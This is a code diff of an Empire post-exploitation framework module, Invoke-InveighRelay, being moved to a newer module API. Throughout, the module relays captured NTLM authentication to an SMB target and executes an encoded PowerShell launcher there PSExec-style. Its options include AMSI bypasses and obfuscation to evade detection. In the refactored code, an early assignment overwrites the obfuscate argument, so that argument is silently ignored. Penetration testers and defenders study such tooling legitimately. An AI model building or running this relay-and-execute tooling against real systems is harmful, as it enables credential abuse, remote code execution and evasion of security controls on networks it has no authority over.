@@ -1,248 +1,88 @@
 from __future__ import print_function
+
 from builtins import str
 from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-    
-    def __init__(self, mainMenu, params=[]):
-        
-        self.info = {
-            'Name': 'Invoke-InveighRelay',
-            
-            'Author': ['Kevin Robertson'],
-            
-            'Description': ('Inveigh\'s SMB relay function. This module can be used to relay incoming '
-                            'HTTP/Proxy NTLMv1/NTLMv2 authentication requests to an SMB target. If the '
-                            'authentication is successfully relayed and the account has the correct '
-                            'privilege, a specified command or Empire launcher will be executed on the '
-                            'target PSExec style. This module works best while also running collection/inveigh '
-                            'with HTTP disabled. Note that this module exposes only a subset of Inveigh '
-                            'Relay\'s parameters. Inveigh Relay can be used through Empire\'s scriptimport '
-                            'and scriptcmd if additional parameters are needed.'),
-
-            'Software': '',
-
-            'Techniques': ['T1171'],
-
-            'Background': True,
-            
-            'OutputExtension': None,
-            
-            'NeedsAdmin': False,
-            
-            'OpsecSafe': False,
-            
-            'Language': 'powershell',
-            
-            'MinLanguageVersion': '2',
-            
-            'Comments': [
-                'https://github.com/Kevin-Robertson/Inveigh'
-            ]
-        }
-        
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent': {
-                'Description': 'Agent to run module on.',
-                'Required': True,
-                'Value': ''
-            },
-            'Listener': {
-                'Description': 'Listener to use.',
-                'Required': False,
-                'Value': ''
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'UserAgent': {
-                'Description': 'User-agent string to use for the staging request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'Proxy_': {
-                'Description': 'Proxy to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'ProxyCreds': {
-                'Description': r'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'Command': {
-                'Description': 'Command to execute on relay target. Do not wrap in quotes and use PowerShell escape characters and newlines where necessary.',
-                'Required': False,
-                'Value': ''
-            },
-            'ConsoleOutput': {
-                'Description': '(Low/Medium/Y) Default = Y: Enable/Disable real time console output. Medium and Low can be used to reduce output.',
-                'Required': False,
-                'Value': ''
-            },
-            'ConsoleStatus': {
-                'Description': 'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in Empire.',
-                'Required': False,
-                'Value': ''
-            },
-            'ConsoleUnique': {
-                'Description': '(Y/N) Default = Y: Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations.',
-                'Required': False,
-                'Value': ''
-            },
-            'HTTP': {
-                'Description': '(Y/N) Default = Y: Enable/Disable HTTP challenge/response capture/relay.',
-                'Required': False,
-                'Value': ''
-            },
-            'Proxy': {
-                'Description': r'(Y/N) Default = N: Enable/Disable Inveigh\'s proxy server authentication capture/relay.',
-                'Required': False,
-                'Value': ''
-            },
-            'ProxyPort': {
-                'Description': r'Default = 8492: TCP port for Inveigh\'s proxy listener.',
-                'Required': False,
-                'Value': ''
-            },
-            'RunTime': {
-                'Description': 'Run time duration in minutes.',
-                'Required': True,
-                'Value': ''
-            },
-            'Service': {
-                'Description': 'Default = 20 character random: Name of the service to create and delete on the target.',
-                'Required': False,
-                'Value': ''
-            },
-            'SMB1': {
-                'Description': '(Switch) Force SMB1.',
-                'Required': False,
-                'Value': ''
-            },
-            'Target': {
-                'Description': 'IP address or hostname of system to target for relay.',
-                'Required': True,
-                'Value': ''
-            },
-            'Usernames': {
-                'Description': r'Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.',
-                'Required': False,
-                'Value': ''
-            },
-            'WPADAuth': {
-                'Description': '(Anonymous/NTLM) HTTP listener authentication type for wpad.dat requests.',
-                'Required': False,
-                'Value': ''
-            }
-            
-        }
-        
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-        
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-    
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
 
         # Set booleans to false by default
-        Obfuscate = False
-        AMSIBypass = False
-        AMSIBypass2 = False
+        obfuscate = False
+        amsi_bypass = False
+        amsi_bypass2 = False
 
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy_']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        command = self.options['Command']['Value']
-        if (self.options['Obfuscate']['Value']).lower() == 'true':
-            Obfuscate = True
-        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
-        if (self.options['AMSIBypass']['Value']).lower() == 'true':
-            AMSIBypass = True
-        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
-            AMSIBypass2 = True
+        listener_name = params['Listener']
+        user_agent = params['UserAgent']
+        proxy = params['Proxy_']
+        proxyCreds = params['ProxyCreds']
+        command = params['Command']
+        if (params['Obfuscate']).lower() == 'true':
+            obfuscate = True
+        obfuscate_command = params['ObfuscateCommand']
+        if (params['AMSIBypass']).lower() == 'true':
+            amsi_bypass = True
+        if (params['AMSIBypass2']).lower() == 'true':
+            amsi_bypass2 = True
 
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
+        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
         
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
         
-        script = moduleCode
+        script = module_code
         
         if command == "":
-            if not self.mainMenu.listeners.is_listener_valid(listenerName):
+            if not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listenerName))
+                print(helpers.color("[!] Invalid listener: " + listener_name))
                 return ""
             
             else:
                 
                 # generate the PowerShell one-liner with all of the proper options set
-                command = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
-                                                                  obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy,
-                                                                  proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
+                command = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                                  obfuscate=obfuscate, obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy,
+                                                                  proxyCreds=proxyCreds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
                 # check if launcher errored out. If so return nothing
                 if command == "":
                     print(helpers.color("[!] Error in launcher generation."))
                     return ""
 
         # set defaults for Empire
-        scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (command)
+        script_end = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (command)
         
-        for option, values in self.options.items():
+        for option, values in params.items():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "useragent" and option.lower() != "proxy_" and option.lower() != "proxycreds" and option.lower() != "command":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
+                if values and values != '':
+                    if values.lower() == "true":
                         # if we're just adding a switch
-                        scriptEnd += " -" + str(option)
+                        script_end += " -" + str(option)
                     else:
-                        if "," in str(values['Value']):
-                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
-                            scriptEnd += " -" + str(option) + " " + quoted
+                        if "," in str(values):
+                            quoted = '"' + str(values).replace(',', '","') + '"'
+                            script_end += " -" + str(option) + " " + quoted
                         else:
-                            scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
+                            script_end += " -" + str(option) + " \"" + str(values) + "\""
         # Get the random function name generated at install and patch the stager with the proper function name
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
-                                          obfuscationCommand=obfuscationCommand)
-        script += scriptEnd
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
+                                          obfuscationCommand=obfuscation_command)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
